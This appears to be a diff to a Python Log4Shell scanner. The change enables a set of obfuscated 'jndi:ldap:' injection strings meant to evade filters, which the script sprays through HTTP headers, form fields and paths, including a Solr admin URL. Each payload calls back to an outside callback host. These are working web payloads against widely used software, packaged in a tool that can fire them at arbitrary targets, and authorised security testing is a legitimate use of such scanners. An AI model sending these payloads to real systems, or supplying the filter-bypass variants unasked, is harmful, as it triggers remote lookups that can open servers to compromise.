@@ -55,12 +55,12 @@ default_headers = {
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 
 protocols = [f"jndi:ldap:",
-            #f'${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}'
-            f'jnd${{123%25ff:-${{123%25ff:-i:}}}}ldap:']
-            # f'j${{mAin:\k5:-Nd}}i${{sPrIng:k5:-:}}',
-            # f'j${{sYs:k5:-nD}}${{loWer:i${{weB:k5:-:}}}}',
-            # f'j${{::-nD}}i${{::-:}}',
-            # f'j${{EnV:K5:-nD}}i:ldap:',]
+            f'${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}',
+            f'jnd${{123%25ff:-${{123%25ff:-i:}}}}ldap:',
+            f'j${{mAin:\k5:-Nd}}i${{sPrIng:k5:-:}}',
+            f'j${{sYs:k5:-nD}}${{loWer:i${{weB:k5:-:}}}}',
+            f'j${{::-nD}}i${{::-:}}',
+            f'j${{EnV:K5:-nD}}i:ldap:']
 
 all_paths = ['/',
     f'/solr/admin/collections?action=${{jndi:ldap:%2F%2F{{callback_host}}/{{random}}}}',
@@ -306,8 +306,6 @@ def scan_url(url, callback_host):
         headers = get_fuzzing_headers(payload)
         if args.request_type.upper() == "GET" or args.run_all_tests:
             for path in paths:
-                print(url)
-                print(path)
                 get_url = f'{url}{path}'
                 future = async_session.get(url=get_url,
                                 headers=headers,
@@ -481,6 +479,7 @@ def main():
 if __name__ == "__main__":
     try:
         main()
+        counter = len(futures)
         for future in as_completed(futures):
             if args.wait_response:
                 try:
@@ -489,6 +488,7 @@ if __name__ == "__main__":
                 except:
                     pass
             counter -= 1
+            cprint(f"[•] Pending responses: {counter}", "cyan")
     except KeyboardInterrupt:
         print("\nKeyboardInterrupt Detected.")
         print("Exiting...")
